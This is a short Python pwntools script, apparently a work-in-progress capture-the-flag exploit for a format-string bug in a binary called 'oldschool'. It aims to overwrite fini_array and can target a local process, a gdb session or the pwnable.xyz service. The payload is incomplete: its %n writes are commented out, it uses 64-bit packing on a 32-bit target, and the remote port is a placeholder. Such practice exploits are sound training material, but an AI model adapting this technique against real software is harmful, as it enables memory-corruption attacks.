#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./oldschool"

rhp1 = {"host":"svc.pwnable.xyz","port":"xxx"}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='i386')
binf = ELF(FILENAME)

fini_array_addr = 0x80496dc

def exploit(conn):
  conn.recv(4)
  print("OK")
  payload = p64(fini_array_addr)
  #payload = "%267$n" #libc_start_main+241
  #payload += "%"+str(0xff-len(payload))+"c"
  payload += "A"*(0xff-len(payload))
  payload += "%7$x"
  conn.sendline(payload)
  
  
if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
      b *0x8048516
    """
    #0x8048516: printf(FSB)
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

